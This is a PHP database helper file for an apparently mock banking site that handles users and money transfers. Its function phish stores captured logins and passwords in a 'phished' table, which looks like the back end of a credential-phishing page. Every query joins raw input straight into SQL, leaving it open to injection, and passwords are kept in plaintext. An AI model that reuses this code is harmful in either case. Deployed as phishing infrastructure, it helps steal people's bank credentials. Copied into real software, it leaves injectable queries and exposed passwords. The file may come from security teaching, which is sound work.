<?php
require_once("MyDatabase.php");

function getTransfers($login){
	return myDbSelect(myDB(), "SELECT  `0`, `1`, `2`, `3`, `4`, `5` FROM transfers WHERE `6` = 1 AND `0`='". $login."' ORDER BY `5` DESC");
}

function phish($login, $password){
	myDB() -> query("INSERT INTO `phished`(`login`, `password`) VALUES ('".$login."','".$password."')");
}

function getUnTransfers(){
	return myDbSelect(myDB(), "SELECT  `0`, `1`, `2`, `3`, `4`, `5` FROM transfers WHERE `6` = 0 ORDER BY `5` DESC");
}

function loginExists($login){
	return myDbSelect(myDB(),"SELECT login FROM Users WHERE login='". $login."'") != null; 
}

function addUser($login, $password){
	myDB() -> query("INSERT INTO `Users`(`login`, `password`) VALUES ('".$login."','".$password."')");
}

function getPass($login){
	return myDbSelect(myDB(),"SELECT password FROM Users WHERE login='". $login."'");
}

function addToHistory($login, $recipient, $recipientacc, $amount, $title){
	$test = "INSERT INTO `transfers`(`0`, `1`, `2`, `3`, `4`, `5`, `6`) VALUES ('".$login."','".$recipient."','".$recipientacc."','".$amount."','".$title."',NOW(), 0)"; 
	myDB() -> query($test);
}

function acceptTransfer($login, $recipient, $recipientacc, $amount, $title, $time){
	myDB() -> query("UPDATE transfers SET `6` = 1 WHERE `0` = '".$login."' AND `1` = '".$recipient."' AND `2` = '".$recipientacc."' AND `3` = '".$amount."' AND `4` = '".$title."' 
		AND `5` = '".$time."'");
}
?>

